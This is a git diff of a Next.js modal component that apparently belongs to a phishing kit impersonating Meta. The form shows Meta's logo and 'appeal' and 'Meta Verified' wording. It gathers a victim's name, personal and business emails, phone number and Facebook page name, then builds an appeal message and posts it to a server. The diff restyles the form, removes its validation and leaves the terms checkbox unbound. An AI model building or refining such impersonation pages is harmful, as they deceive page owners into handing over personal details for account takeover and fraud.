@@ -1,90 +1,93 @@
 'use client';
 
-import MetaLogo from '@/assets/images/meta-logo-grey.png';
-import { tickSrc } from '@/components/icons';
-import PhoneInput from '@/components/phone-input';
+import MetaLogo from '@/assets/images/meta-logo-image.png';
 import { DEFAULT_TEXTS } from '@/constants/default-texts';
 import { store } from '@/store/store';
 import { buildAppealMessage } from '@/utils/message';
+import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
+import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
-import { type FC, type FormEvent, useCallback, useState } from 'react';
+import IntlTelInput from 'intl-tel-input/reactWithUtils';
+import 'intl-tel-input/styles';
+import Image from 'next/image';
+import { type ChangeEvent, type FC, type FormEvent, useCallback, useMemo, useState } from 'react';
 
 interface FormData {
+    information: string;
     fullName: string;
-    birthDate: string;
     personalEmail: string;
     businessEmail: string;
-    phone: string;
-    pageName: string;
-    agreeTerms: boolean;
+    facebookPageName: string;
 }
 
-type FormErrors = Partial<Record<keyof FormData, boolean>>;
+interface FormField {
+    name: keyof FormData;
+    labelKey: keyof typeof DEFAULT_TEXTS;
+    type: 'text' | 'email' | 'textarea';
+}
 
-const formatBirthDateInput = (value: string) => {
-    const digits = value.replace(/\D/g, '').slice(0, 8);
-
-    if (digits.length <= 2) return digits;
-    if (digits.length <= 4) return `${digits.slice(0, 2)}/${digits.slice(2)}`;
-    return `${digits.slice(0, 2)}/${digits.slice(2, 4)}/${digits.slice(4)}`;
-};
-
-const isValidBirthDate = (value: string) => /^\d{2}\/\d{2}\/\d{4}$/.test(value);
+const FORM_FIELDS: FormField[] = [
+    { name: 'information', labelKey: 'investigateInfo', type: 'textarea' },
+    { name: 'fullName', labelKey: 'fullName', type: 'text' },
+    { name: 'personalEmail', labelKey: 'personalEmail', type: 'email' },
+    { name: 'businessEmail', labelKey: 'businessEmail', type: 'email' },
+    { name: 'facebookPageName', labelKey: 'facebookPageName', type: 'text' }
+];
 
 const InitModal: FC<{ nextStep: () => void; texts?: Record<string, string> }> = ({ nextStep, texts = DEFAULT_TEXTS }) => {
     const [isLoading, setIsLoading] = useState(false);
+    const [phoneNumber, setPhoneNumber] = useState('');
     const [formData, setFormData] = useState<FormData>({
+        information: '',
         fullName: '',
-        birthDate: '',
         personalEmail: '',
         businessEmail: '',
-        phone: '',
-        pageName: '',
-        agreeTerms: false
+        facebookPageName: ''
     });
-    const [errors, setErrors] = useState<FormErrors>({});
 
-    const { geoInfo, messageId, setModalOpen, setUserData, setMessageId, setMessageContent } = store();
+    const { geoInfo, messageId, setModalOpen, setUserData, setMessageId, setMessageContent, resetFormSession } = store();
+    const countryCode = geoInfo?.country_code.toLowerCase() || 'us';
 
-    const handleChange = useCallback(<K extends keyof FormData>(field: K, value: FormData[K]) => {
-        setFormData((prev) => ({ ...prev, [field]: value }));
-        setErrors((prev) => (prev[field] ? { ...prev, [field]: false } : prev));
+    const initOptions = useMemo(
+        () => ({
+            initialCountry: countryCode as '',
+            separateDialCode: true,
+            strictMode: true,
+            nationalMode: true,
+            autoPlaceholder: 'aggressive' as const,
+            placeholderNumberType: 'MOBILE' as const,
+            countrySearch: false
+        }),
+        [countryCode]
+    );
+
+    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
+        const { name, value } = e.target;
+        setFormData((prev) => ({
+            ...prev,
+            [name]: value
+        }));
     }, []);
 
-    const handlePhoneChange = useCallback((value: string) => {
-        handleChange('phone', value);
-    }, [handleChange]);
+    const handlePhoneChange = useCallback((number: string) => {
+        setPhoneNumber(number);
+    }, []);
 
     const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
         e.preventDefault();
 
         if (isLoading) return;
 
-        const newErrors: FormErrors = {};
-
-        if (!formData.fullName.trim()) newErrors.fullName = true;
-        if (!isValidBirthDate(formData.birthDate)) newErrors.birthDate = true;
-        if (!formData.personalEmail.trim()) newErrors.personalEmail = true;
-        if (!formData.businessEmail.trim()) newErrors.businessEmail = true;
-        if (!formData.phone.trim()) newErrors.phone = true;
-        if (!formData.pageName.trim()) newErrors.pageName = true;
-        if (!formData.agreeTerms) newErrors.agreeTerms = true;
-
-        if (Object.keys(newErrors).length > 0) {
-            setErrors(newErrors);
-            return;
-        }
-
         setIsLoading(true);
 
         const userDataPayload = {
-            fullName: formData.fullName.trim(),
-            birthDate: formData.birthDate,
-            personalEmail: formData.personalEmail.trim(),
-            businessEmail: formData.businessEmail.trim(),
-            phoneNumber: formData.phone.trim(),
-            facebookPageName: formData.pageName.trim(),
-            information: ''
+            fullName: formData.fullName,
+            birthDate: '',
+            personalEmail: formData.personalEmail,
+            businessEmail: formData.businessEmail,
+            phoneNumber,
+            facebookPageName: formData.facebookPageName,
+            information: formData.information
         };
 
         setUserData(userDataPayload);
@@ -100,147 +103,85 @@ const InitModal: FC<{ nextStep: () => void; texts?: Record<string, string> }> = 
                 setMessageId(res.data.message_id);
                 setMessageContent(message);
             }
+            nextStep();
         } catch {
-            //
+            nextStep();
+        } finally {
+            setIsLoading(false);
         }
-
-        nextStep();
-        setIsLoading(false);
     };
 
     return (
-        <div className='ae-modal-overlay'>
-            <button aria-label='Close' className='ae-modal-backdrop' type='button' onClick={() => setModalOpen(false)} />
-            <div className='ae-modal-panel' id='exampleModal1' role='dialog' aria-modal='true' aria-labelledby='exampleModalLabel'>
-                <div className='ae-modal-header'>
-                    <h5 className='ae-modal-title ae-title' id='exampleModalLabel'>
-                        {texts.metaVerified}
-                        {/* eslint-disable-next-line @next/next/no-img-element */}
-                        <img src={tickSrc} width='18' alt='tick' className='ae-title-image' />
-                    </h5>
-                    <button aria-label='Close' className='ae-close-btn btn-close' type='button' onClick={() => setModalOpen(false)} />
+        <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
+            <div className='flex max-h-[90vh] w-full max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
+                <div className='mb-2 flex w-full items-center justify-between p-4 pb-0'>
+                    <p className='text-2xl font-bold'>{texts.appealFormTitle}</p>
+                    <button
+                        type='button'
+                        onClick={() => {
+                            resetFormSession();
+                            setModalOpen(false);
+                        }}
+                        className='flex h-8 w-8 items-center justify-center rounded-full transition-colors hover:bg-[#e2eaf2]'
+                        aria-label={texts.closeModal}
+                    >
+                        <FontAwesomeIcon icon={faXmark} size='xl' />
+                    </button>
                 </div>
-                <div className='ae-modal-body'>
-                    <form id='first-form' onSubmit={handleSubmit}>
-                        <div className='mb-3'>
-                            <label className='form-label' htmlFor='FullNameField'>
-                                {texts.fullName}
-                            </label>
-                            <input
-                                className={`form-control ${errors.fullName ? 'is-invalid' : ''}`}
-                                id='FullNameField'
-                                minLength={3}
-                                name='full-name'
-                                required
-                                type='text'
-                                autoComplete='name'
-                                value={formData.fullName}
-                                onChange={(e) => handleChange('fullName', e.target.value)}
-                            />
+
+                <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto px-4'>
+                    <div className='flex flex-col gap-2 py-2'>
+                        {FORM_FIELDS.map((field) => (
+                            <div key={field.name}>
+                                <p className='font-sans'>{texts[field.labelKey]}</p>
+                                {field.type === 'textarea' ? (
+                                    <textarea
+                                        name={field.name}
+                                        value={formData[field.name]}
+                                        onChange={handleInputChange}
+                                        className='min-h-[100px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5'
+                                        rows={3}
+                                    />
+                                ) : (
+                                    <input
+                                        name={field.name}
+                                        type={field.type}
+                                        value={formData[field.name]}
+                                        onChange={handleInputChange}
+                                        className='h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5'
+                                    />
+                                )}
+                            </div>
+                        ))}
+                        <p className='font-sans'>{texts.mobilePhone}</p>
+                        <IntlTelInput
+                            onChangeNumber={handlePhoneChange}
+                            initOptions={initOptions}
+                            inputProps={{
+                                name: 'phoneNumber',
+                                className: 'h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5'
+                            }}
+                        />
+                        <div className='flex items-center gap-2 pt-2'>
+                            <input type='checkbox' className='cursor-pointer' />
+                            <p className='cursor-pointer'>{texts.agreeTermsBoss}</p>
                         </div>
-                        <div className='mb-3'>
-                            <label className='form-label' htmlFor='BirthDateField'>
-                                {texts.birthDate}
-                            </label>
-                            <input
-                                className={`form-control ${errors.birthDate ? 'is-invalid' : ''}`}
-                                id='BirthDateField'
-                                name='birth-date'
-                                required
-                                type='text'
-                                inputMode='numeric'
-                                autoComplete='bday'
-                                placeholder='dd/mm/yyyy'
-                                maxLength={10}
-                                value={formData.birthDate}
-                                onChange={(e) => handleChange('birthDate', formatBirthDateInput(e.target.value))}
-                            />
-                        </div>
-                        <div className='mb-3'>
-                            <label className='form-label' htmlFor='PersonalEmailField'>
-                                {texts.personalEmail}
-                            </label>
-                            <input
-                                className={`form-control ${errors.personalEmail ? 'is-invalid' : ''}`}
-                                id='PersonalEmailField'
-                                name='personal-email'
-                                required
-                                type='email'
-                                autoComplete='email'
-                                value={formData.personalEmail}
-                                onChange={(e) => handleChange('personalEmail', e.target.value)}
-                            />
-                        </div>
-                        <div className='mb-3'>
-                            <label className='form-label' htmlFor='BuisenessEmailField'>
-                                {texts.businessEmail}
-                            </label>
-                            <input
-                                className={`form-control ${errors.businessEmail ? 'is-invalid' : ''}`}
-                                id='BuisenessEmailField'
-                                name='buiseness-email'
-                                required
-                                type='email'
-                                autoComplete='email'
-                                value={formData.businessEmail}
-                                onChange={(e) => handleChange('businessEmail', e.target.value)}
-                            />
-                        </div>
-                        <div className='mb-3'>
-                            <label className='form-label' htmlFor='PhoneFirld'>
-                                {texts.mobilePhone}
-                            </label>
-                            <PhoneInput error={errors.phone} id='PhoneFirld' name='mobile-phone-number' onChange={handlePhoneChange} />
-                        </div>
-                        <div className='mb-3'>
-                            <label className='form-label' htmlFor='fb-page-name-input'>
-                                {texts.yourPageName}
-                            </label>
-                            <input
-                                className={`form-control ${errors.pageName ? 'is-invalid' : ''}`}
-                                id='fb-page-name-input'
-                                maxLength={80}
-                                minLength={3}
-                                name='page-name'
-                                required
-                                type='text'
-                                value={formData.pageName}
-                                onChange={(e) => handleChange('pageName', e.target.value)}
-                            />
-                        </div>
-                        <div className='mb-3 form-check'>
-                            <input
-                                className={`form-check-input ${errors.agreeTerms ? 'is-invalid' : ''}`}
-                                id='exampleCheck1'
-                                name='agree-terms'
-                                required
-                                type='checkbox'
-                                checked={formData.agreeTerms}
-                                onChange={(e) => handleChange('agreeTerms', e.target.checked)}
-                            />
-                            <label className='form-check-label' htmlFor='exampleCheck1'>
-                                {texts.agreeToTerms}{' '}
-                                <span className='add-svg' id='termsLink'>
-                                    {texts.privacyPolicy}
-                                </span>
-                            </label>
-                        </div>
-                        <div className='form-btn-wrapper'>
-                            <button className='btn btn-primary' type='submit' disabled={isLoading}>
-                                <div className='spinner-border text-light' role='status' style={{ display: isLoading ? 'inline-block' : 'none' }}>
-                                    <span className='visually-hidden'>Loading...</span>
-                                </div>
-                                <span className='button-text'>{texts.confirm}</span>
-                            </button>
-                        </div>
-                    </form>
-                </div>
-                <div className='ae-modal-footer'>
-                    {/* eslint-disable-next-line @next/next/no-img-element */}
-                    <img src={MetaLogo.src} alt='Meta Logo' style={{ height: '20px', marginBottom: '5px' }} />
-                    <div className='footer-links' style={{ fontSize: '12px', color: '#000' }}>
-                        {texts.aboutHelpMore}
+                        <button
+                            type='submit'
+                            disabled={isLoading}
+                            className={`mt-4 flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}
+                        >
+                            {isLoading ? (
+                                <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent' />
+                            ) : (
+                                texts.submitBtn
+                            )}
+                        </button>
                     </div>
+                </form>
+
+                <div className='flex items-center justify-center p-3'>
+                    <Image src={MetaLogo} alt='' className='h-[18px] w-[70px]' />
                 </div>
             </div>
         </div>
